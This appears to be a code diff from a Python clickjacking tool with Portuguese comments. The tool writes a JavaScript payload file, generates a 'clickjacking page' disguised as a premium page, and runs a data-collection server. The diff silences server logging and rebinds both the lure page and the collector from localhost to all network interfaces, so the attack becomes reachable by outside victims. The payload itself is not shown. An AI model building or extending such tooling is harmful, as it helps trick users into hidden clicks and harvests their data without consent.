@@ -192,7 +192,6 @@ class PageGenerator:
             with open(os.path.join(Config.WORK_DIR, 'payload.js'), 'w') as f:
                 f.write(PageGenerator._generate_javascript_payload())
             
-            # Imagens (seriam baixadas de um CDN real em produção)
             print(f"{Colors.GREEN}[+] Página premium criada com sucesso!{Colors.END}")
             Utils.log_activity("Página de clickjacking gerada")
         except Exception as e:
@@ -1260,6 +1259,15 @@ class DataCollector(SimpleHTTPRequestHandler):
         except Exception as e:
             Utils.log_activity(f"Erro ao salvar dados: {e}")
 
+# Servidor HTTP personalizado
+class CustomHTTPRequestHandler(SimpleHTTPRequestHandler):
+    def __init__(self, *args, **kwargs):
+        super().__init__(*args, directory=Config.WORK_DIR, **kwargs)
+    
+    def log_message(self, format, *args):
+        # Silencia os logs padrão do servidor
+        pass
+
 # Gerenciador de servidores aprimorado
 class ServerManager:
     @staticmethod
@@ -1270,12 +1278,12 @@ class ServerManager:
                 pass
             
             # Servidor web principal
-            web_server = HTTPServer(('localhost', Config.PORT), SimpleHTTPRequestHandler)
+            web_server = HTTPServer(('0.0.0.0', Config.PORT), CustomHTTPRequestHandler)
             web_thread = threading.Thread(target=web_server.serve_forever)
             web_thread.daemon = True
             
             # Servidor de coleta de dados
-            data_server = HTTPServer(('localhost', Config.DATA_PORT), CustomHandler)
+            data_server = HTTPServer(('0.0.0.0', Config.DATA_PORT), CustomHandler)
             data_server.display_data = display_data  # Adiciona flag para exibição
             data_thread = threading.Thread(target=data_server.serve_forever)
             data_thread.daemon = True
